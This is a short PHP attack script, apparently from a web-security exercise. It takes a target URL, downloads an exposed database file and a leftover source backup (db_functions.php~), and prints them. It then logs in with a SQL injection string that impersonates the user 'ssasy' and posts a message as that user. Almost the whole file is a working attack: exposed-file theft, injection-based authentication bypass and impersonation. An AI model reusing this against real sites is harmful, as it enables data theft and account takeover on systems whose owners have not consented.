<?php
include 'main.php';
if($argc==1)
{
  echo "No url provided";
  exit();
}else{
  $mainUrl = $argv[1];
}
//This is the file where we save the    information
getFileAtAddress($mainUrl,"docs/data.db", "data.db");
getFileAtAddress($mainUrl,"db_functions.php~", "db_functions.php");
$output = shell_exec("ls -al");
echo $output;
$output2 = shell_exec("cat db_functions.php");
echo $output2;
signIn($mainUrl,"' or username = 'ssasy");
postAThing($mainUrl,2,"I am ssasy","http://google.ca");

?>
